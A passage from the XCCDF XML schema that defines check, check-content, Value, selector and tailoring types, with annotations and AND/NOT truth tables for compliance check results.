                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="AND">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The logical AND of the component
                        terms</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:complexType name="checkType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check&gt; element. The
                &lt;xccdf:check&gt; element identifies instructions for tests to determine
                compliance with the &lt;xccdf:Rule&gt; as well as parameters controlling the
                reporting of those test results. The &lt;xccdf:check&gt; element must have at least
                one child element. </xsd:documentation>
            <xsd:appinfo>
                <evaluation_documentation>The two axes represent a pairwise combination of results.
                    Order of evaluation will not matter. Possible results are abbreviated as
                    follows: P = Pass, F = Fail, U = Unknown, E = Error, N = Not Applicable, K = Not
                    Checked, S = Not Selected, I = Informational. </evaluation_documentation>
                <evaluation_chart xml:space="preserve">
   AND             || P | F | U | E | N | K | S | I ||
-------------------||-------------------------------||
          Pass (P) || P | F | U | E | P | P | P | P ||
          Fail (F) || F | F | F | F | F | F | F | F ||
       Unknown (U) || U | F | U | U | U | U | U | U ||
         Error (E) || E | F | U | E | E | E | E | E || 
 Notapplicable (N) || P | F | U | E | N | N | N | N ||
    Notchecked (K) || P | F | U | E | N | K | K | K ||
   Notselected (S) || P | F | U | E | N | K | S | S || 
 Informational (I) || P | F | U | E | N | K | S | I ||
------------------------------------------------------</evaluation_chart>
                <evaluation_chart xml:space="preserve">
NOT || P | F | U | E | N | K | S | I ||
----||-------------------------------||
    || F | P | U | E | N | K | S | I ||
---------------------------------------</evaluation_chart>
            </xsd:appinfo>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="check-import" type="cdf:checkImportType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Identifies a value to be retrieved from the
                        checking system during testing of a target system. This element's body must
                        be empty within an &lt;xccdf:check&gt;. After the associated check results
                        have been collected, the result structure returned by the checking engine is
                        processed to collect the named information. This information is then
                        recorded in the check-import element in the corresponding
                        &lt;xccdf:rule-result&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-export" type="cdf:checkExportType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A mapping from an &lt;xccdf:Value&gt; element
                        to a checking system variable (i.e., external name or id for use by the
                        checking system). This supports export of tailoring values from the XCCDF
                        processing environment to the checking system.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-content-ref" minOccurs="0" maxOccurs="unbounded"
                type="cdf:checkContentRefType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Points to code for a detached check in another
                        location that uses the language or system specified by the
                        &lt;xccdf:check&gt; element’s @system attribute. If multiple
                        &lt;xccdf:check-content-ref&gt; elements appear, they represent alternative
                        locations from which a benchmark consumer may obtain the check content.
                        Benchmark consumers should process the alternatives in the order in which
                        they appear in the XML. The first &lt;xccdf:check-content-ref&gt; from which
                        content can be successfully retrieved should be used.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="check-content" minOccurs="0" maxOccurs="1"
                type="cdf:checkContentType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds the actual code of a check, in the
                        language or system specified by the &lt;xccdf:check&gt; element’s @system
                        attribute. If both &lt;xccdf:check-content-ref&gt; and
                        &lt;xccdf:check-content&gt; elements appear in a single &lt;xccdf:check&gt;
                        element, benchmark consumers should use the &lt;xccdf:check-content&gt;
                        element only if none of the references can be resolved to provide
                        content.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="system" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI for a checking system. If the checking
                    system uses XML namespaces, then the system attribute for the system should be
                    its namespace. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="negate" type="xsd:boolean" use="optional" default="false">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If set to true, the final result of the
                    &lt;xccdf:check&gt; is negated according to the truth table given below.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this element. Optional, but
                    must be globally unique if present.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">This may be referenced from &lt;xccdf:Profile&gt;
                    selection elements or used during manual tailoring to refine the application of
                    the &lt;xccdf:Rule&gt;. If no selector values are specified for a given
                    &lt;xccdf:Rule&gt; by &lt;xccdf:Profile&gt; elements or manual tailoring, all
                    &lt;xccdf:check&gt; elements with non-empty @selector attributes are ignored. If
                    an &lt;xccdf:Rule&gt; has multiple &lt;xccdf:check&gt; elements with the same
                    @selector attribute, each must employ a different checking system, as identified
                    by the @system attribute of the &lt;xccdf:check&gt; element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="multi-check" type="xsd:boolean" use="optional" default="false">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Applicable in cases where multiple checks are
                    executed to determine compliance with a single &lt;xccdf:Rule&gt;. This
                    situation can arise when an &lt;xccdf:check&gt; includes an
                    &lt;xccdf:check-content-ref&gt; element that does not include a @name attribute.
                    The default behavior of a nameless &lt;xccdf:check-content-ref&gt; is to execute
                    all checks in the referenced check content location and AND their results
                    together into a single &lt;xccdf:rule-result&gt; using the AND truth table
                    below. This corresponds to a @multi-check attribute value of “false”. If,
                    however, the @multi-check attribute is set to "true" and a nameless
                    &lt;xccdf:check-content-ref&gt; is used, the &lt;xccdf:Rule&gt; produces a
                    separate &lt;xccdf:rule-result&gt; for each check.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
    </xsd:complexType>

    <xsd:complexType name="checkImportType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-import&gt; element,
                which specifies a value that the &lt;xccdf:Benchmark&gt; author wishes to retrieve
                from the checking system during testing of a target system. The @import-name
                attribute identifies some structure in the checking system that is then retrieved.
                The mapping from the values of this attribute to specific checking system structures
                is beyond the scope of the XCCDF specification. When the &lt;xccdf:check-import&gt;
                element appears in the context of an &lt;xccdf:Rule&gt;, then it should be empty and
                any content must be ignored. When the &lt;xccdf:check-import&gt; element appears in
                the context of an &lt;xccdf:rule-result&gt;, then its body holds the imported value.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:any processContents="skip" minOccurs="0"/>
        </xsd:sequence>
        <xsd:attribute name="import-name" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier indicating some structure in the
                    checking system to be collected. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="import-xpath" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An XPath that is used to select specific values or
                    structures from the imported structure. This allows further refinement of the
                    collected data if the imported value takes the form of XML structures.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkExportType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-export&gt; element,
                which specifies a mapping from an &lt;xccdf:Value&gt; element to a checking system
                variable (i.e., external name or id for use by the checking system). This supports
                export of tailoring &lt;xccdf:Value&gt; elements from the XCCDF processing
                environment to the checking system. The interface between the XCCDF benchmark
                consumer and the checking system should support, at a minimum, passing the
                &lt;xccdf:value&gt; property of the &lt;xccdf:Value&gt; element, but may also
                support passing the &lt;xccdf:Value&gt; element's @type and @operator
                properties.</xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="value-id" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id of the &lt;xccdf:Value&gt; element to
                    export. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="export-name" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier indicating some structure in the
                    checking system into which the identified &lt;xccdf:Value&gt; element's
                    properties will be mapped. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkContentRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-content-ref&gt;
                element, which points to the code for a detached check in another file. This element
                has no body, just a couple of attributes: @href and @name. The @name is optional, if
                it does not appear then this reference is to the entire document.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies the referenced document containing
                    checking instructions. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="name" type="xsd:string">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies a particular part or element of the
                    referenced check document. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="checkContentType" mixed="true">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:check-content&gt; element.
                The body of this element holds the actual code of a check, in the language or system
                specified by the &lt;xccdf:check&gt; element’s @system attribute. The body of this
                element may be any XML, but cannot contain any XCCDF elements. XCCDF tools do not
                process its content directly but instead pass the content directly to checking
                engines. </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="0" maxOccurs="unbounded">
            <xsd:any namespace="##other" processContents="skip"/>
        </xsd:choice>
    </xsd:complexType>

    <xsd:simpleType name="weightType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for an &lt;xccdf:Rule&gt; element's weight,
                a non-negative real number. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:decimal">
            <xsd:minInclusive value="0.0"/>
            <xsd:totalDigits value="3"/>
        </xsd:restriction>
    </xsd:simpleType>

    <!-- ************************************************************** -->
    <!-- *******************  Value Element  ************************** -->
    <!-- ************************************************************** -->
    <xsd:element name="Value" type="cdf:valueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Value&gt; element is a named parameter
                that can be substituted into properties of other elements within the
                &lt;xccdf:Benchmark&gt;, including the interior of structured check specifications
                and fix scripts.</xsd:documentation>
        </xsd:annotation>
        <xsd:unique name="valueSelectorKey">
            <xsd:selector xpath="./cdf:value|cdf:complex-value"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="defaultSelectorKey">
            <xsd:selector xpath="./cdf:default|cdf:complex-default"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="matchSelectorKey">
            <xsd:selector xpath="./cdf:match"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="lower-boundSelectorKey">
            <xsd:selector xpath="./cdf:lower-bound"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="upper-boundSelectorKey">
            <xsd:selector xpath="./cdf:upper-bound"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
        <xsd:unique name="choicesSelectorKey">
            <xsd:selector xpath="./cdf:choices"/>
            <xsd:field xpath="@selector"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="valueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Value&gt; element, which
                is a named parameter that can be substituted into properties of other elements
                within the &lt;xccdf:Benchmark&gt;, including the interior of structured check
                specifications and fix scripts. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:itemType">
                <xsd:sequence>
                    <xsd:choice minOccurs="1" maxOccurs="unbounded">
                        <xsd:element name="value" type="cdf:selStringType" minOccurs="1"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A simple (number, string, or
                                    boolean) value associated with this &lt;xccdf:Value&gt;. At any
                                    time an &lt;xccdf:Value&gt; has one active (simple or complex)
                                    value. If a selector value has been provided under
                                    &lt;xccdf:Profile&gt; selection or tailoring then the active
                                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; is the one with
                                    a matching @selector. If there is no provided selector or if the
                                    provided selector does not match the @selector attribute of any
                                    &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, the active
                                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; is the one with
                                    an empty or absent @selector or, failing that, the first
                                    &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; in the XML.
                                    When an &lt;xccdf:Value&gt; is exported or used in text
                                    substitution, it is the currently active &lt;xccdf:value&gt; or
                                    &lt;xccdf:complex-value&gt; that is actually used. If there are
                                    multiple &lt;xccdf:value&gt; and/or &lt;xccdf:complex-value&gt;
                                    elements, only one may omit a @selector attribute and no two may
                                    have the same @selector value.</xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-value" type="cdf:selComplexValueType"
                            minOccurs="1" maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">A complex (list) value associated
                                    with this &lt;xccdf:Value&gt;. See the description of the
                                    &lt;xccdf:value&gt; property for &lt;xccdf:Rule&gt; elements
                                    regarding activation of an &lt;xccdf:complex-value&gt;.
                                </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:choice minOccurs="0" maxOccurs="unbounded">
                        <xsd:element name="default" type="cdf:selStringType" minOccurs="1"
                            maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The default value displayed to the
                                    user as a suggestion by benchmark producers during tailoring of
                                    this &lt;xccdf:Value&gt; element. (This is not the default value
                                    of an &lt;xccdf:Value&gt;; it is just the default display.) If
                                    there are multiple &lt;xccdf:default&gt; and/or
                                    &lt;xccdf:complex-default&gt; elements, only one may omit a
                                    @selector attribute and no two may have the same @selector
                                    value. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                        <xsd:element name="complex-default" type="cdf:selComplexValueType"
                            minOccurs="1" maxOccurs="1">
                            <xsd:annotation>
                                <xsd:documentation xml:lang="en">The default
                                    &lt;xccdf:complex-value&gt; displayed to the user as a
                                    suggestion by benchmark producers during tailoring of this
                                    &lt;xccdf:Value&gt; element. (This is not the default value of
                                    an &lt;xccdf:Value&gt;; it is just the default display.) If
                                    there are multiple &lt;xccdf:default&gt; and
                                    &lt;xccdf:complex-default&gt; elements, only one may omit a
                                    @selector attribute and no two may have the same @selector
                                    value. </xsd:documentation>
                            </xsd:annotation>
                        </xsd:element>
                    </xsd:choice>
                    <xsd:element name="match" type="cdf:selStringType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A Perl Compatible Regular Expression
                                that a benchmark producer may apply during tailoring to validate a
                                user’s input for the &lt;xccdf:Value&gt;. It uses implicit
                                anchoring. It applies only when the @type property is “string” or
                                “number” or a list of strings and/or numbers.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="lower-bound" type="cdf:selNumType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Minimum legal value for this
                                &lt;xccdf:Value&gt;. It is used to constrain value input during
                                tailoring, when the @type property is “number”. Values supplied by
                                the user for tailoring the &lt;xccdf:Benchmark&gt; must be equal to
                                or greater than this number. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="upper-bound" type="cdf:selNumType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">Maximum legal value for this
                                &lt;xccdf:Value&gt;. It is used to constrain value input during
                                tailoring, when the @type is “number”. Values supplied by the user
                                for tailoring the &lt;xccdf:Benchmark&gt; must be less than or equal
                                to than this number. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="choices" type="cdf:selChoicesType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A list of legal or suggested choices
                                (values) for an &lt;xccdf:Value&gt; element, to be used during
                                tailoring and document generation. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="source" type="cdf:uriRefType" minOccurs="0"
                        maxOccurs="unbounded">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">URI indicating where the tool may
                                acquire values, value bounds, or value choices for this
                                &lt;xccdf:Value&gt; element. XCCDF does not attach any meaning to
                                the URI; it may be an arbitrary community or tool-specific value, or
                                a pointer directly to a resource. If several instances of the
                                &lt;xccdf:source&gt; property appear, then they represent
                                alternative means or locations for obtaining the value in descending
                                order of preference (i.e., most preferred first).
                            </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element name="signature" type="cdf:signatureType" minOccurs="0"
                        maxOccurs="1">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">A digital signature asserting
                                authorship and allowing verification of the integrity of the
                                &lt;xccdf:Value&gt;. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:sequence>
                <xsd:attribute name="id" type="cdf:valueIdType" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The unique identifier for this element.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="type" type="cdf:valueTypeType" default="string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The data type of the &lt;xccdf:Value&gt;. A
                            tool may choose any convenient form to store an &lt;xccdf:Value&gt;
                            element’s &lt;xccdf:value&gt; element, but the @type attribute conveys
                            how the &lt;xccdf:Value&gt; should be treated for user input validation
                            purposes during tailoring processing. The @type attribute may also be
                            used to give additional guidance to the user or to validate the user’s
                            input. In the case of a list of values, the @type attribute, if present,
                            applies to all elements of the list individually.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="operator" type="cdf:valueOperatorType" default="equals"
                    use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The operator to be used for comparing this
                            &lt;xccdf:Value&gt; to some part of the test system’s configuration
                            during &lt;xccdf:Rule&gt; checking. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="interactive" type="xsd:boolean" default="0" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether tailoring for this
                            &lt;xccdf:Value&gt; should be performed during &lt;xccdf:Benchmark&gt;
                            application. The benchmark consumer may ignore the attribute if asking
                            the user is not feasible or not supported.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="interfaceHint" use="optional" type="cdf:interfaceHintType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A hint or recommendation to a benchmark
                            consumer or producer about how the user might select or adjust the
                            &lt;xccdf:Value&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>


    <!-- ************************************************************** -->
    <!-- ***************  Value-related Types  ************************ -->
    <!-- ************************************************************** -->
    <xsd:complexType name="complexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type that supports values that are lists of simple
                types. Each element in the list is represented by an instance of the
                &lt;xccdf:item&gt; child element. If there are no &lt;xccdf:item&gt; child elements
                then this represents an empty list. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="item" minOccurs="0" maxOccurs="unbounded" type="xsd:string">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single item in the list of values.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="selComplexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type that supports values that are lists of
                simple types with an associated @selector attribute used in tailoring.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:complexValueType">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given item by &lt;xccdf:Profile&gt; elements or manual
                            tailoring, properties with empty or non-existent @selector attributes
                            are activated. If a selector is applied that does not match the
                            @selector attribute of any of a given type of property, then no
                            &lt;xccdf:choices&gt; element is considered activated. The only
                            exception is the &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt;
                            properties of an &lt;xccdf:Value&gt; element - if there is no
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; property with a
                            matching @selector value then the
                            &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with an empty
                            or absent @selector attribute becomes active. If there is no such
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, then the first
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; listed becomes
                            active. This reflects the fact that all &lt;xccdf:Value&gt; elements
                            require an active value property at all times.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="selChoicesType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> The type of the &lt;xccdf:choice&gt; element, which
                specifies a list of legal or suggested choices for an &lt;xccdf:Value&gt; object.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:choice minOccurs="1" maxOccurs="unbounded">
            <xsd:element name="choice" type="xsd:string" minOccurs="1" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single choice holding a simple type. (I.e.,
                        number, string, or boolean.) </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="complex-choice" type="cdf:complexValueType" minOccurs="1"
                maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A single choice holding a list of simple
                        types.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:choice>
        <xsd:attribute name="mustMatch" type="xsd:boolean" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">True if the listed choices are the only permissible
                    settings for the given &lt;xccdf:Value&gt;. False if choices not specified in
                    this &lt;xccdf:choices&gt; element are acceptable settings for this
                    &lt;xccdf:Value&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">This may be referenced from &lt;xccdf:Profile&gt;
                    selection elements or used during manual tailoring to refine the application of
                    the &lt;xccdf:Rule&gt;. If no selectors are specified for a given
                    &lt;xccdf:Value&gt; by &lt;xccdf:Profile&gt; elements or manual tailoring, an
                    &lt;xccdf:choice&gt; element with an empty or non-existent @selector attribute
                    is activated. If a selector is applied that does not match the @selector
                    attribute of any &lt;xccdf:choices&gt; element, then no &lt;xccdf:choices&gt;
                    element is considered activated.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="selStringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type is for an element that has string content
                and a @selector attribute for use in tailoring. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given property by &lt;xccdf:Profile&gt; elements or
                            manual tailoring, properties with empty or non-existent @selector
                            attributes are activated. If a selector is applied that does not match
                            the @selector attribute of any of a given type of property, then no
                            property of that type is considered activated. The only exception is the
                            &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; properties of an
                            &lt;xccdf:Value&gt; element - if there is no &lt;xccdf:value&gt; or
                            &lt;xccdf:complex-value&gt; property with a matching @selector value
                            then the &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with
                            an empty or absent @selector attribute becomes active. If there is no
                            such &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt;, then the first
                            &lt;xccdf:value&gt; or &lt;xccdf:complex-value&gt; listed in the XML
                            becomes active. This reflects the fact that all &lt;xccdf:Value&gt;
                            elements require an active value property at all
                            times.</xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="selNumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type is for an element that has numeric content
                and a @selector attribute for use during tailoring. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:decimal">
                <xsd:attribute name="selector" default="" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">This may be referenced from
                            &lt;xccdf:Profile&gt; selection elements or used during manual tailoring
                            to refine the application of this property. If no selectors are
                            specified for a given property by &lt;xccdf:Profile&gt; elements or
                            manual tailoring, properties with empty or non-existent @selector
                            attributes are activated. If a selector is applied that does not match
                            the @selector attribute of any of a given type of property, then no
                            property of that type considered activated. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="uriRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for elements that have no content and a
                single @uri attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="uri" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">A URI.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:simpleType name="valueTypeType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed data types for &lt;xccdf:Value&gt; elements,
                string, numeric, and boolean. A tool may choose any convenient form to store an
                &lt;xccdf:Value&gt; element’s &lt;xccdf:value&gt; element, but the @type conveys how
                the value should be treated for user input validation purposes during tailoring
                processing. The @type may also be used to give additional guidance to the user or to
                validate the user’s input. For example, if an &lt;xccdf:value&gt; element’s @type
                attribute is “number”, then a tool might choose to reject user tailoring input that
                is not composed of digits. In the case of a list of values, the @type applies to all
                elements of the list individually. Note that checking systems may have their own
                understanding of data types that may not be identical to the typing indicated in
                XCCDF </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="number">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A numeric value. This may be decimal or
                        integer.</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="string">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Any character data</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="boolean">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">True/false</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="valueOperatorType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This type enumerates allowed values of the @operator
                property of &lt;xccdf:Value&gt; elements. The specific interpretation of these
                operators depends on the checking system used. </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="equals"/>
            <xsd:enumeration value="not equal"/>
            <xsd:enumeration value="greater than"/>
            <xsd:enumeration value="less than"/>
            <xsd:enumeration value="greater than or equal"/>
            <xsd:enumeration value="less than or equal"/>
            <xsd:enumeration value="pattern match"/>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="interfaceHintType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Allowed interface hint values. &lt;xccdf:Value&gt;
                elements may contain a hint or recommendation to a benchmark consumer or producer
                about how the user might select or adjust the &lt;xccdf:Value&gt;. This type
                enumerates the possible values of this hint.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="choice">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Multiple choice</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="textline">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Multiple lines of text</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="text">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Single line of text</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="date">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Date</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="datetime">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Date and time</xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <!-- ************************************************************** -->
    <!-- *******************  Profile Element  ************************ -->
    <!-- ************************************************************** -->
    <xsd:element name="Profile" type="cdf:profileType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Profile&gt; element is a named tailoring
                for an &lt;xccdf:Benchmark&gt;. While an &lt;xccdf:Benchmark&gt; can be tailored in
                place by setting properties of various elements, &lt;xccdf:Profile&gt; elements
                allow one &lt;xccdf:Benchmark&gt; document to hold several independent
                tailorings.</xsd:documentation>
        </xsd:annotation>
        <!-- selector key constraints -->
        <xsd:unique name="itemSelectKey">
            <xsd:selector xpath="./cdf:select"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
